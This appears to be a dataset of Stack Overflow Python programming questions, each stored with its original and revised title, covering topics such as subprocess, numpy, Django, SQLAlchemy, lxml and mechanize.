Executing a C script in python?," I have this C program, at least I think it is (files: spa.c, spa.h). Is there any way I can execute this script from Python WITHOUT passing extra arguments to the Python interpreter (if not, what would the arguments be?)Update: Thanks for your replies. The source code can be found at http://www.nrel.gov/midc/spa/#register(Please do not be scared by the 'register' in the url, if you fill in the form, you can immediately download the files (no validation mails, etc) I will try your suggestions and report back with the results.Update 2: I compiled the source code using gcc, but now it gives me a permission denied when trying to call(), even when running python as root (im on Ubuntu 10:10).Update 3 [Errno 8] Exec format errorUpdate 4 Ok, I got it working. Program outputs values using printf: Thanks all! <code>  >>> call(['/path'])Julian Day: 2452930.312847L: 2.401826e+01 degreesB: -1.011219e-04 degreesR: 0.996542 AUH: 11.105902 degreesDelta Psi: -3.998404e-03 degreesDelta Epsilon: 1.666568e-03 degreesEpsilon: 23.440465 degreesZenith: 50.111622 degreesAzimuth: 194.340241 degreesIncidence: 25.187000 degreesSunrise: 06:12:43 Local TimeSunset: 17:20:19 Local Time",Executing a C program in python?
"Python compiler error, x takes no arguments (1 given)"," I'm writing a small piece of python as a homework assignment, and I'm not getting it to run! I don't have that much Python-experience, but I know quite a lot of Java. I'm trying to implement a Particle Swarm Optimization algorithm, and here's what I have: Now, I see no reason why this shouldn't work. However, when I run it, I get this error:""TypeError: updateVelocity() takes no arguments (1 given)""I don't understand! I'm not giving it any arguments!Thanks for the help,Linus <code>  class Particle: def __init__(self,domain,ID): self.ID = ID self.gbest = None self.velocity = [] self.current = [] self.pbest = [] for x in range(len(domain)): self.current.append(random.randint(domain[x][0],domain[x][1])) self.velocity.append(random.randint(domain[x][0],domain[x][1])) self.pbestx = self.current def updateVelocity(): for x in range(0,len(self.velocity)): self.velocity[x] = 2*random.random()*(self.pbestx[x]-self.current[x]) + 2 * random.random()*(self.gbest[x]-self.current[x]) def updatePosition(): for x in range(0,len(self.current)): self.current[x] = self.current[x] + self.velocity[x] def updatePbest(): if costf(self.current) < costf(self.best): self.best = self.current def psoOptimize(domain,costf,noOfParticles=20, noOfRuns=30): particles = [] for i in range(noOfParticles): particle = Particle(domain,i) particles.append(particle) for i in range(noOfRuns): Globalgbest = [] cost = 9999999999999999999 for i in particles: if costf(i.pbest) < cost: cost = costf(i.pbest) Globalgbest = i.pbest for particle in particles: particle.updateVelocity() particle.updatePosition() particle.updatePbest(costf) particle.gbest = Globalgbest return determineGbest(particles,costf)","Python interpreter error, x takes no arguments (1 given)"
how to send asynchronous email using django  .," This is my code: It doesn't send email. What can I do? <code>  class EmailThread(threading.Thread): def __init__(self, subject, html_content, recipient_list): self.subject = subject self.recipient_list = recipient_list self.html_content = html_content threading.Thread.__init__(self) def run (self): msg = EmailMultiAlternatives(self.subject, self.html_content, EMAIL_HOST_USER, self.recipient_list) #if self.html_content: msg.attach_alternative(True, ""text/html"") msg.send()def send_mail(subject, html_content, recipient_list): EmailThread(subject, html_content, recipient_list).start()",how to send asynchronous email using django  
Pydev DocStrings," I've gotten Pydev up and running, and almost all is working well. However I'm having some trouble with docstrings.Let's say for instance I have a function such as the following: Assume I've overridden repr to format that string properly as well.When I hover over this in Eclipse it shows me the full docstring as intended. However, the full implementation is also displayed below the doctsting.Is there a way to only display the docstring? <code>  def _get_logging_statement(self): """"""Returns an easy to read string which separates items in the log file cleanly"""""" result = ""\n\n#============================================="" result += ""\n# %-80s#""(self) result =+ ""\n\n#============================================"" return result",Displaying function documentation in PyDev
Python DocStrings & Pydev," I've gotten Pydev up and running, and almost all is working well. However I'm having some trouble with docstrings.Let's say for instance I have a function such as the following: Assume I've overridden repr to format that string properly as well.When I hover over this in Eclipse it shows me the full docstring as intended. However, the full implementation is also displayed below the doctsting.Is there a way to only display the docstring? <code>  def _get_logging_statement(self): """"""Returns an easy to read string which separates items in the log file cleanly"""""" result = ""\n\n#============================================="" result += ""\n# %-80s#""(self) result =+ ""\n\n#============================================"" return result",Displaying function documentation in PyDev
numpy: access an array by column," Suppose I have: test[i] gets me ith line of the array (eg [1, 2]). How can I access the ith column? (eg [1, 3, 5]). Also, would this be an expensive operation? <code>  test = numpy.array([[1, 2], [3, 4], [5, 6]])",How to access the ith column of a NumPy multidimensional array?
"In Python, why doesn't exec work in a function with a subfunction?"," It looks like you can't use exec in a function that has a subfunction...Anyone know why this Python code doesn't work? I get an error at the exec in test2. Also, I know exec's aren't good style, but trust me, I'm using exec for an appropriate reason. I wouldn't use it otherwise. EDIT: I narrowed down the bug to having a function in a subfunction. It has nothing to do with the raise keyword. <code>  #!/usr/bin/env python#def test1(): exec('print ""hi from test1""')test1()def test2(): """"""Test with a subfunction."""""" exec('print ""hi from test2""') def subfunction(): return Truetest2()",Why doesn't exec work in a function with a subfunction?
How to structure Python package that contains Cython code," I'd like to make a Python package containing some Cython code. I've got the the Cython code working nicely. However, now I want to know how best to package it.For most people who just want to install the package, I'd like to include the .c file that Cython creates, and arrange for setup.py to compile that to produce the module. Then the user doesn't need Cython installed in order to install the package.But for people who may want to modify the package, I'd also like to provide the Cython .pyx files, and somehow also allow for setup.py to build them using Cython (so those users would need Cython installed).How should I structure the files in the package to cater for both these scenarios?The Cython documentation gives a little guidance. But it doesn't say how to make a single setup.py that handles both the with/without Cython cases. <code> ",How should I structure a Python package that contains Cython code
Run command with no terminal output," I want to run a command in pythong, using the subprocess module, and store the output in a variable. However, I do not want the command's output to be printed to the terminal.For this code: I get the directory listing in the terminal, instead of having it stored in a. I've also tried: This also prints the output of ls to my terminal. I've even tried this command with the somewhat dated os.system method, since running ls > tmp in the terminal doesn't print ls to the terminal at all, but stores it in tmp. However, the same thing happens.Edit:I get the following error after following marcog's advice, but only when running a more complex command. cdrecord --help. Python spits this out: <code>  def storels(): a = subprocess.Popen(""ls"",shell=True)storels() def storels(): subprocess.Popen(""ls > tmp"",shell=True) a = open(""./tmp"") [Rest of Code] storels() Traceback (most recent call last): File ""./install.py"", line 52, in <module> burntrack2(""hi"") File ""./install.py"", line 46, in burntrack2 a = subprocess.Popen(""cdrecord --help"",stdout = subprocess.PIPE) File ""/usr/lib/python2.6/subprocess.py"", line 633, in __init__ errread, errwrite) File ""/usr/lib/python2.6/subprocess.py"", line 1139, in _execute_child raise child_exceptionOSError: [Errno 2] No such file or directory",Pipe subprocess standard output to a variable
Python ascii to binary, Is there a builtin function that converts ASCII to binary?For example. converts 'P' to 01010000.I'm using Python 2.6.6 <code> ,Python ASCII to binary
python: iterating over a stack," What's the best way to iterate over a stack in Python? I couldn't find an isempty method, and checking the length each time seems wrong somehow. <code>  a = [1,2,3,4]while (len(a) > 0) print a.pop()# prints 4, 3, 2, 1 in sequence","Iterating over a stack (reverse list), is there an isempty() method?"
how to make my python script easy portable? or how to compile into binary with all module dependencies?, Is there any way to compile python script into binary?I have one file python script which uses a lot of modules.What I would like is to have its copy on other machines (freebsd) but without installing all needed modules on every host.What are possible solutions in such cases? <code> ,How to make my python script easy portable? or how to compile into binary with all module dependencies?
Python file iterator over a binary file with newer idiom. ," With a text file, I can write this: This is equivalent to this: This idiom is documented in PEP 234 but I have failed to locate a similar idiom for binary files.With a binary file, I can write this: I have tried the same idiom that with a text file: Is it the idiomatic way to iterate over a binary file in Python? <code>  with open(path, 'r') as file: for line in file: # handle the line with open(path, 'r') as file: for line in iter(file.readline, ''): # handle the line with open(path, 'rb') as file: while True: chunk = file.read(1024 * 64) if not chunk: break # handle the chunk def make_read(file, size): def read(): return file.read(size) return readwith open(path, 'rb') as file: for chunk in iter(make_read(file, 1024 * 64), b''): # handle the chunk",What is the idiomatic way to iterate over a binary file?
What is the idiomatic way to iterate over a binary file in Python?," With a text file, I can write this: This is equivalent to this: This idiom is documented in PEP 234 but I have failed to locate a similar idiom for binary files.With a binary file, I can write this: I have tried the same idiom that with a text file: Is it the idiomatic way to iterate over a binary file in Python? <code>  with open(path, 'r') as file: for line in file: # handle the line with open(path, 'r') as file: for line in iter(file.readline, ''): # handle the line with open(path, 'rb') as file: while True: chunk = file.read(1024 * 64) if not chunk: break # handle the chunk def make_read(file, size): def read(): return file.read(size) return readwith open(path, 'rb') as file: for chunk in iter(make_read(file, 1024 * 64), b''): # handle the chunk",What is the idiomatic way to iterate over a binary file?
How can I run .aggregate() on a field introduced using .extra(select={...}) in a Djanjo Query?," I'm trying to get the count of the number of times a player played each week like this: But Django complains that I can do it in raw SQL like this Is there a good way to do this without executing raw SQL in Django? <code>  player.game_objects.extra( select={'week': 'WEEK(`games_game`.`date`)'}).aggregate(count=Count('week')) FieldError: Cannot resolve keyword 'week' into field. Choices are: <lists model fields> SELECT WEEK(date) as week, COUNT(WEEK(date)) as count FROM games_gameWHERE player_id = 3GROUP BY week",Using .aggregate() on a value introduced using .extra(select={...}) in a Django Query?
How can I run .aggregate() on a field introduced using .extra(select={...}) in a Django Query?," I'm trying to get the count of the number of times a player played each week like this: But Django complains that I can do it in raw SQL like this Is there a good way to do this without executing raw SQL in Django? <code>  player.game_objects.extra( select={'week': 'WEEK(`games_game`.`date`)'}).aggregate(count=Count('week')) FieldError: Cannot resolve keyword 'week' into field. Choices are: <lists model fields> SELECT WEEK(date) as week, COUNT(WEEK(date)) as count FROM games_gameWHERE player_id = 3GROUP BY week",Using .aggregate() on a value introduced using .extra(select={...}) in a Django Query?
Python Remove Duplicate Chars using Regex," Let's say I want to remove all duplicate chars (of a particular char) in a string using regular expressions. This is simple - What if I want to replace all duplicate chars (i.e. a,z) with that respective char? How do I do this? NOTE: I know this remove duplicate approach can be better tackled with a hashtable or some O(n^2) algo, but I want to explore this using regexes <code>  import rere.sub(""a*"", ""a"", ""aaaa"") # gives 'a' import rere.sub('[a-z]*', <what_to_put_here>, 'aabb') # should give 'ab're.sub('[a-z]*', <what_to_put_here>, 'abbccddeeffgg') # should give 'abcdefg'",Remove duplicate chars using regex?
Detecting whether or not text is English," I'm looking for a simple way to detect whether a short excerpt of text, a few sentences, is English or not. Seems to me that this problem is much easier than trying to detect an arbitrary language. Is there any software out there that can do this? I'm writing in python, and would prefer a python library, but something else would be fine too. I've tried google, but then realized the TOS didn't allow automated queries. <code> ",Detecting whether or not text is English (in bulk)
How can I specify a database for Django Tests to use instead of having it build it everytime?, I want to be able to use an existing test database to run my tests against and not have Django create and delete a database every time I want to run the tests. Is this possible? <code> ,How can I specify a database for Django Tests to use instead of having it build it every time?
What parts of header need to be spoofed to make it looks real using mechanize browser?," OK, here's the header(just an example) info I got from Live HTTP Header while logging into an account: Normally I would code like this: Above code works fine. My question is, do I also need to add these following lines (and more in previous header infos) in LoginHeader to make it really looks like firefox's surfing, not mechanize? What parts/how many of header info need to be spoofed to make it looks ""real""? <code>  http://example.com/login.htmlPOST /login.html HTTP/1.1Host: example.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Keep-Alive: 115Connection: keep-aliveReferer: http://example.comCookie: blahblahblah; blah = blahblahContent-Type: application/x-www-form-urlencodedContent-Length: 39username=shane&password=123456&do=loginHTTP/1.1 200 OKDate: Sat, 18 Dec 2010 15:41:02 GMTServer: Apache/2.2.3 (CentOS)X-Powered-By: PHP/5.2.14Set-Cookie: blah = blahblah_blah; expires=Sun, 18-Dec-2011 15:41:02 GMT; path=/; domain=.example.com; HttpOnlySet-Cookie: blah = blahblah; expires=Sun, 18-Dec-2011 15:41:02 GMT; path=/; domain=.example.com; HttpOnlySet-Cookie: blah = blahblah; expires=Sun, 18-Dec-2011 15:41:02 GMT; path=/; domain=.example.com; HttpOnlyCache-Control: private, no-cache=""set-cookie""Expires: 0Pragma: no-cacheContent-Encoding: gzipVary: Accept-EncodingContent-Length: 4135Keep-Alive: timeout=10, max=100Connection: Keep-AliveContent-Type: text/html; charset=UTF-8 import mechanizeimport urllib2MechBrowser = mechanize.Browser()LoginUrl = ""http://example.com/login.html""LoginData = ""username=shane&password=123456&do=login""LoginHeader = {""User-Agent"": ""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)"", ""Referer"": ""http://example.com""}LoginRequest = urllib2.Request(LoginUrl, LoginData, LoginHeader)LoginResponse = MechBrowser.open(LoginRequest) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",How to get mechanize requests to look like they originate from a real browser
What parts of header need to be spoofed to make it looks real(use mechanize browser to spoof)?," OK, here's the header(just an example) info I got from Live HTTP Header while logging into an account: Normally I would code like this: Above code works fine. My question is, do I also need to add these following lines (and more in previous header infos) in LoginHeader to make it really looks like firefox's surfing, not mechanize? What parts/how many of header info need to be spoofed to make it looks ""real""? <code>  http://example.com/login.htmlPOST /login.html HTTP/1.1Host: example.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Keep-Alive: 115Connection: keep-aliveReferer: http://example.comCookie: blahblahblah; blah = blahblahContent-Type: application/x-www-form-urlencodedContent-Length: 39username=shane&password=123456&do=loginHTTP/1.1 200 OKDate: Sat, 18 Dec 2010 15:41:02 GMTServer: Apache/2.2.3 (CentOS)X-Powered-By: PHP/5.2.14Set-Cookie: blah = blahblah_blah; expires=Sun, 18-Dec-2011 15:41:02 GMT; path=/; domain=.example.com; HttpOnlySet-Cookie: blah = blahblah; expires=Sun, 18-Dec-2011 15:41:02 GMT; path=/; domain=.example.com; HttpOnlySet-Cookie: blah = blahblah; expires=Sun, 18-Dec-2011 15:41:02 GMT; path=/; domain=.example.com; HttpOnlyCache-Control: private, no-cache=""set-cookie""Expires: 0Pragma: no-cacheContent-Encoding: gzipVary: Accept-EncodingContent-Length: 4135Keep-Alive: timeout=10, max=100Connection: Keep-AliveContent-Type: text/html; charset=UTF-8 import mechanizeimport urllib2MechBrowser = mechanize.Browser()LoginUrl = ""http://example.com/login.html""LoginData = ""username=shane&password=123456&do=login""LoginHeader = {""User-Agent"": ""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)"", ""Referer"": ""http://example.com""}LoginRequest = urllib2.Request(LoginUrl, LoginData, LoginHeader)LoginResponse = MechBrowser.open(LoginRequest) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",How to get mechanize requests to look like they originate from a real browser
How to include a quote in a raw Python string?," Consider: So how do we get the quote, but not the slash?And please don't suggest r'what""ever', because then the question just becomes how do we include both types of quotes?Related <code>  >>> r""what""ever""SyntaxError: invalid syntax>>> r""what\""ever""'what\\""ever'",How to include a quote in a raw Python string
 Setup.py install lxml with python2.6 on CentOS," I have installed Python 2.6.6 on CentOS 5.4, I want to use the lxml module, but build from sources failed: <code>  [@SC-055 lxml-2.3beta1]$ pythonPython 2.6.6 (r266:84292, Jan 4 2011, 09:49:55) [GCC 4.1.2 20080704 (Red Hat 4.1.2-46)] on linux2Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> src/lxml/lxml.etree.c:157929: error: xsltLibxsltVersion undeclared (first use in this function)src/lxml/lxml.etree.c:157941: error: __pyx_v_4lxml_5etree_XSLT_DOC_DEFAULT_LOADER undeclared (first use in this function)src/lxml/lxml.etree.c:157941: error: xsltDocDefaultLoader undeclared (first use in this function)src/lxml/lxml.etree.c:157950: error: __pyx_f_4lxml_5etree__xslt_doc_loader undeclared (first use in this function)error: command 'gcc' failed with exit status 1",Setup.py: install lxml with Python2.6 on CentOS
Reversing a part of list in Python," Why doesn't this work? <code>  # to reverse a part of the string in place a = [1,2,3,4,5]a[2:4] = reversed(a[2:4]) # This works!a[2:4] = [0,0] # This works too.a[2:4].reverse() # But this doesn't work",How do I reverse a part (slice) of a list in Python?
First templating project in jinja - where do you store the variables?," I've got five pages with the same page layout and structure, but some different colors, text, etc, so this is an ideal environment for templating. I've decided to use Jinja2 and probably flask. I've read through the documentation, and some tutorials online, which explain lots about what you can do with templates on a page but not much about how to send variables to the page. Where do you store the page-specific variables? How does the code know which page has been requested and which variables to load?  <code> ",Where do you store the variables in jinja?
[Python] mutable versus immutable types, Is there a table or a chart somewhere online which shows what types (inbuilt) are mutable and immutable in python? <code> ,Chart of mutable versus immutable types
Mutable versus immutable types, Is there a table or a chart somewhere online which shows what types (inbuilt) are mutable and immutable in python? <code> ,Chart of mutable versus immutable types
how to dynamicly create sqlalchemy column," I have a csv file with first line as fields and remaining lines as data. With this file I would like to create a table. Since the fields are quite long and may vary, I want to dynamically create it. After several tries and searches, I figured I could maybe generate a Class from factory and then assign the attributes to the new class could generate dynamic columns. But it fails. And based on the error, I tried some other methods, all failed. Please help. I'm considering whether it's doable for such an idea. The error is like: <code>  Reader = csv.reader(open('Book1.csv', 'rb'), delimiter=',', quotechar='|')TableItem = Reader.next()[0:]def Factory(*args, **kwargs): args=args[0] def init(self, *iargs, **ikwargs): #setattr(self,__tablename__,ikwargs[__tablename__]) for k,v in kwargs.items(): setattr(self, k, v) for i in range(len(iargs)): setattr(self, args[i], iargs[i]) for k,v in ikwargs.items(): setattr(self, k, v) name = kwargs.pop(""name"", ""myFactory"") kwargs.update(dict((k, None) for k in args)) return type(name, (object,), {'__init__': init})LIS=Factory(TableItem)class newLIS(LIS,Base): __tablename__='testonly' passmytest=[]for row in Reader: mytest.append(newLIS(row)) sqlalchemy.exc.ArgumentError: Mapper Mapper|newLIS|testonly could not assembleany primary key columns for mapped table 'testonly'",how to dynamically create SQLAlchemy columns
how to dynamically create SQLAlchemy column," I have a csv file with first line as fields and remaining lines as data. With this file I would like to create a table. Since the fields are quite long and may vary, I want to dynamically create it. After several tries and searches, I figured I could maybe generate a Class from factory and then assign the attributes to the new class could generate dynamic columns. But it fails. And based on the error, I tried some other methods, all failed. Please help. I'm considering whether it's doable for such an idea. The error is like: <code>  Reader = csv.reader(open('Book1.csv', 'rb'), delimiter=',', quotechar='|')TableItem = Reader.next()[0:]def Factory(*args, **kwargs): args=args[0] def init(self, *iargs, **ikwargs): #setattr(self,__tablename__,ikwargs[__tablename__]) for k,v in kwargs.items(): setattr(self, k, v) for i in range(len(iargs)): setattr(self, args[i], iargs[i]) for k,v in ikwargs.items(): setattr(self, k, v) name = kwargs.pop(""name"", ""myFactory"") kwargs.update(dict((k, None) for k in args)) return type(name, (object,), {'__init__': init})LIS=Factory(TableItem)class newLIS(LIS,Base): __tablename__='testonly' passmytest=[]for row in Reader: mytest.append(newLIS(row)) sqlalchemy.exc.ArgumentError: Mapper Mapper|newLIS|testonly could not assembleany primary key columns for mapped table 'testonly'",how to dynamically create SQLAlchemy columns
Fixing '../../' paths in python., Is there an easy way in Python to resolve path operators like ..? For instance is there a function call that will convert: /../../test/../path to /path? <code> ,Fixing '../../' paths in python
find time shift between to similar waveforms," I have to compare two time-vs-voltage waveforms. Because of the peculiarity of the sources of these waveforms, one of them can be a time shifted version of the other. How can i find whether there is a time shift? and if yes, how much is it.I am doing this in Python and wish to use numpy/scipy libraries. <code> ",find time shift between two similar waveforms
Goggle App engine framework choice," i want to develop a big web application in Google App engine, but I don't know which framework to use in order to obtain the MVC Model. I prefer to use Spring MVC, but I read that several problems with GAE. Another option would be to use django with python but I have never used that. What framework or option do you recommend? Are there other frameworks?Greetings <code> ",Framework Choice / Recommendations for Google App Engine
Framework Choice / Recommendations for Goggle App Engine," i want to develop a big web application in Google App engine, but I don't know which framework to use in order to obtain the MVC Model. I prefer to use Spring MVC, but I read that several problems with GAE. Another option would be to use django with python but I have never used that. What framework or option do you recommend? Are there other frameworks?Greetings <code> ",Framework Choice / Recommendations for Google App Engine
"use of ""global"" keyword in python"," What I understand from reading the documentation is that Python has a separate namespace for functions, and if I want to use a global variable in that function, I need to use global.I'm using Python 2.7 and I tried this little test It seems things are working fine even without global. I was able to access global variable without any problem.Am I missing anything? Also, following is from Python documentation: Names listed in a global statement must not be defined as formal parameters or in a for loop control target, class definition, function definition, or import statement.While formal parameters and class definition make sense to me, I'm not able to understand the restriction on for loop control target and function definition. <code>  >>> sub = ['0', '0', '0', '0']>>> def getJoin():... return '.'.join(sub)...>>> getJoin()'0.0.0.0'","Use of ""global"" keyword in Python"
String literals in python," Is there a way to declare a string variable in python such that everything inside of it is automatically escaped, or has its literal character value? I'm not asking how to escape the quotes with slashes, that's obvious. What I'm asking for is a general purpose way for making everything in a string literal so that I don't have to manually go through and escape everything for very large strings. Anyone know of a solution? Thanks! <code> ",How to write string literals in python without having to escape them?
Python 3 - Moduel: subprocess," Hi Stack Overflow users,I've encountered a frustrating problem, can't find the answer to it.Yesterday I was trying to find a way to HIDE a subprocess.Popen. So for example, if i was opening the cmd. I would like it to be hidden, permanently.I found this code: It worked like a charm!But today, for reasons I don't need to get into, I had to reinstall python 3 (32bit)Now, when I run my program I get this error: I'm using 32bit, python3.1.3 ... just like before.If you have any clues/alternatives PLEASE post, thanks.NOTE: I am looking for a SHORT method to hide the app, not like two pages of code please <code>  kwargs = {}if subprocess.mswindows: su = subprocess.STARTUPINFO() su.dwFlags |= subprocess.STARTF_USESHOWWINDOW su.wShowWindow = subprocess.SW_HIDE kwargs['startupinfo'] = su subprocess.Popen(""cmd.exe"", **kwargs) Traceback (most recent call last): File ""C:\Python31\hello.py"", line 7, in <module> su.dwFlags |= subprocess.STARTF_USESHOWWINDOWAttributeError: 'module' object has no attribute 'STARTF_USESHOWWINDOW'",Module subprocess has no attribute 'STARTF_USESHOWWINDOW'
Python 3 - Module: subprocess," Hi Stack Overflow users,I've encountered a frustrating problem, can't find the answer to it.Yesterday I was trying to find a way to HIDE a subprocess.Popen. So for example, if i was opening the cmd. I would like it to be hidden, permanently.I found this code: It worked like a charm!But today, for reasons I don't need to get into, I had to reinstall python 3 (32bit)Now, when I run my program I get this error: I'm using 32bit, python3.1.3 ... just like before.If you have any clues/alternatives PLEASE post, thanks.NOTE: I am looking for a SHORT method to hide the app, not like two pages of code please <code>  kwargs = {}if subprocess.mswindows: su = subprocess.STARTUPINFO() su.dwFlags |= subprocess.STARTF_USESHOWWINDOW su.wShowWindow = subprocess.SW_HIDE kwargs['startupinfo'] = su subprocess.Popen(""cmd.exe"", **kwargs) Traceback (most recent call last): File ""C:\Python31\hello.py"", line 7, in <module> su.dwFlags |= subprocess.STARTF_USESHOWWINDOWAttributeError: 'module' object has no attribute 'STARTF_USESHOWWINDOW'",Module subprocess has no attribute 'STARTF_USESHOWWINDOW'
How to enable Python support in gvim on Windows?, I'm trying to get Python support in gVim on Windows. Is there a way to accomplish that?I'm using:Windows XP SP3gVim v. 7.3Python 2.7.13 (ActivePython through Windows Installer binaries) <code> ,How to enable Python support in gVim on Windows?
find and replace within a text file ," I have a text file which is about 400,000 lines long. I need to import this text file into a program which only accepts text files which are delimited with spaces or tabs, but this text file is delimited with semi-colons. There is no option in the program I am exporting the text file from (Arcmap) to change the delimination and doing find and replace in the text file itself will literally take 2 days.I have searched for a script to do this but they all seem to replace the whole LINE of the word file with a space, instead of individually replacing each semi-colon, Leaving me with an empty text file.Here is a sample of my text file: I need it to look something like this: <code>  ""OID_"";""POINTID"";""GRID_CODE"";""POINT_X"";""POINT_Y"";1;-56.000000;200900.250122;514999.750122;2;-56.000000;200900.750122;514999.750122;3;-56.000000;200901.250122;514999.750122;4;-57.000000;200901.750122;514999.750122;5;-57.000000;200902.250122;514999.750122;6;-57.000000;200902.750122;514999.750122;7;-57.000000;200903.250122;514999.750122;8;-57.000000;200903.750122;514999.750122;9;-57.000000;200904.250122;514999.750122;10;-57.000000;200904.750122;514999.750122 1 -56.000000 200900.250122 514999.7501222 -56.000000 200900.750122 514999.750122",Find and replace within a text file using Python
creating dictionary from space separated key=value string in python," I have string as follows: I want to convert in to a dictionary as follows: How do I do this in Python? <code>  s = 'key1=1234 key2=""string with space"" key3=""SrtingWithoutSpace""' key | value-----|-------- key1 | 1234key2 | string with spacekey3 | SrtingWithoutSpace",Creating dictionary from space separated key=value string in Python
Djano queryset filter for blank FileField?," How do I perform a Django queryset filter looking for blank files in ""FileField"" fields?The field isn't null, it has a FileObject in it that doesn't have a file.  <code> ",Django queryset filter for blank FileField?
Does Django have a way to open a HTTP long pole connection?," Leave the connection open, until an event occurs. <code> ",Does Django have a way to open a HTTP long poll connection?
How to use SequenceMatcher to find similarity between two strings?Should I need to import any packages other than difflib??," I used the above code but obtained output is 0.0. How can I get a valid answer? <code>  import diffliba='abcd'b='ab123'seq=difflib.SequenceMatcher(a=a.lower(),b=b.lower())seq=difflib.SequenceMatcher(a,b)d=seq.ratio()*100print d",How to use SequenceMatcher to find similarity between two strings?
Why is else clause needed for try statement in python ?," In Python the try statement supports an else clause, which executes if the code in try block does not raise an exception. For example: Why is the else clause needed? Can't we write the above code as follows : Won't the execution proceed to data = f.read() if open does not raise an exception? <code>  try: f = open('foo', 'r')except IOError as e: error_log.write('Unable to open foo : %s\n' % e)else: data = f.read() f.close() try: f = open('foo', 'r') data = f.read() f.close()except IOError as e: error_log.write('Unable to open foo : %s\n' % e)",Why is else clause needed for try statement in python?
Python Convert fraction to decimal," I want to convert 1/2 in python so that when i say print x (where x = 1/2) it returns 0.5I am looking for the most basic way of doing this, without using any split functions, loops or mapsI have tried float(1/2) but I get 0...can someone explain me why and how to fix it?Is it possible to do this without modifying the variable x= 1/2 ? <code> ",Convert fraction to decimal in Python
How to use custom AdminSite class," Which is the best way to implement my own django.contrib.admin.sites.AdminSite?Actually I get a problem with the registration of INSTALLED_APPS in django.contrib.admin.autodiscover. If I use my custom AdminSite class in urls.py, there were no apps displayed on the admin page.I fixed this with a litte hack. I wrote this class: And implement my custom AdminSite like this: So I can use this site for urls.py.Anyone knows a better way? Since I access a var starting with a underscore it is no more than a hack. I don't like hacks.Edit: Another way would be to rewrite the django.contrib.admin.autodiscover function, but in this case I would have redundant code. <code>  from django.contrib.admin.sites import site as default_siteclass AdminSiteRegistryFix( object ): ''' This fix links the '_registry' property to the orginal AdminSites '_registry' property. This is necessary, because of the character of the admins 'autodiscover' function. Otherwise the admin site will say, that you havn't permission to edit anything. ''' def _registry_getter(self): return default_site._registry def _registry_setter(self,value): default_site._registry = value _registry = property(_registry_getter, _registry_setter) from wltrweb.hacks.django.admin import AdminSiteRegistryFixfrom django.contrib.admin import AdminSiteclass MyAdminSite( AdminSite, AdminSiteRegistryFix ): # do some magic pass site = MyAdminSite()",How to use custom AdminSite class?
Adding a date/time stamp to Python print," I am trying to debug the behaviour of a large library I depend on, which uses a scattering (no make that plethora) of debug print statements through its many source files. Trouble is, most if not all of these debug print statements do not contain a date/time stamp so it is hard to associate failures at the application level with failures within the library code itself. Rather than modifying the source code for all the debug prints suspected to be involved in the failure I am seeing, I thought it may be possible to monkey patch the built-in Python print ""function"" temporarily, in order that all output is prefixed with a timestamp. Since the built-in print is not a function in the Python 2.6 environment I am working with, I don't know if this is possible. If anyone has done this or achieved a similar result using another hook into Python then I would be grateful for your advice, or even better the code for a solution to this problem.  <code> ",Adding a datetime stamp to Python print
ElementTree(or lxml) namespace problem.," I want to retrieve a legacy xml file, manipulate and save it.Here is my code: The file I load contains: at the root tag.I have the following problems, related to namespace:As you see, for each tag call, I have give the namespace at the begining to retreive a child.Generated xml file doesn't have <?xml version=""1.0"" encoding=""utf-8""?> at the begining.The tags at the output contains such <ns0:eventDescription> while I need output as the original <eventDescription>, without namespace at the begining.How can these be solved? <code>  from xml.etree import cElementTree as ETNS = ""{http://www.somedomain.com/XI/Traffic/10}""def fix_xml(filename): f = ET.parse(filename) root = f.getroot() eventlist = root.findall(""%(ns)Event"" % {'ns':NS }) xpath = ""%(ns)sEventDetail/%(ns)sEventDescription"" % {'ns':NS } for event in eventlist: desc = event.find(xpath) desc.text = desc.text.upper() # do some editting to the text. ET.ElementTree(root, nsmap=NS).write(""out.xml"", encoding=""utf-8"")shorten_xml(""test.xml"") xmlns=""http://www.somedomain.com/XI/Traffic/10""xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://www.somedomain.com/XI/Traffic/10 10.xds""",Python: namespaces in xml ElementTree (or lxml)
Get the name of a decorated function? - Python," here is my decorator: Here is a wrapped up function: If I do collect_data.__name__ I get wrapper instead of collect_dataAny ideas? <code>  def check_domain(func): def wrapper(domain_id, *args, **kwargs): domain = get_object_or_None(Domain, id=domain_id) if not domain: return None return func(domain_id, *args, **kwargs) return wrapper @check_domaindef collect_data(domain_id, from_date, to_date): do_stuff(...)",Get the name of a decorated function?
Python - all possible variants of zip ," For example, I have a code looks like this: How can I get something like this: Like function zip does, but with all possible variants. Or can't I? <code>  a = [1, 2]b = [4, 5] [(1,4), (1,5), (2,4), (2,5)]",All possible variants of zip in Python
Efficient way of parsing fixed width files in Python," I am trying to find an efficient way of parsing files that holds fixed width lines. For example, the first 20 characters represent a column, from 21:30 another one and so on.Assuming that the line holds 100 characters, what would be an efficient way to parse a line into several components?I could use string slicing per line, but it's a little bit ugly if the line is big. Are there any other fast methods? <code> ",How to efficiently parse fixed width files?
